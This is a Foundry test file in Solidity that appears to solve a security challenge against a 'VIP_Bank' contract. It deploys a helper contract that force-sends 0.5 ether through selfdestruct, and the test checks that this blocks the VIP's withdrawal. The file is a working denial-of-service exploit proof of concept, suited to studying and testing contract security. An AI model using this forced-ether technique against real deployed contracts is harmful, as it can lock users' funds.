// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.7;

import "forge-std/Test.sol";
import "forge-std/console.sol";

import {VIP_Bank} from "../src/VipBank.sol";

contract SendForcedEther {
    constructor(address target) payable {
        selfdestruct(payable(target));
    }
}

contract VipBankTest is Test {
    address private manager = makeAddr("manager");
    address private vip = makeAddr("vip");
    address private hacker = makeAddr("hacker");

    VIP_Bank private challenge;

    function setUp() external {
        vm.startPrank(manager);
        challenge = new VIP_Bank();
        challenge.addVIP(vip);
        vm.stopPrank();

        deal(vip, 0.05 ether);
        vm.prank(vip);
        challenge.deposit{value: 0.05 ether}();

        deal(hacker, 0.5 ether);
    }

    function test_hack() external {
        vm.startPrank(hacker);
        (new SendForcedEther){value: 0.5 ether}(address(challenge));
        vm.stopPrank();

        vm.startPrank(vip);
        vm.expectRevert();
        challenge.withdraw(0.05 ether);
        vm.stopPrank();
    }
}
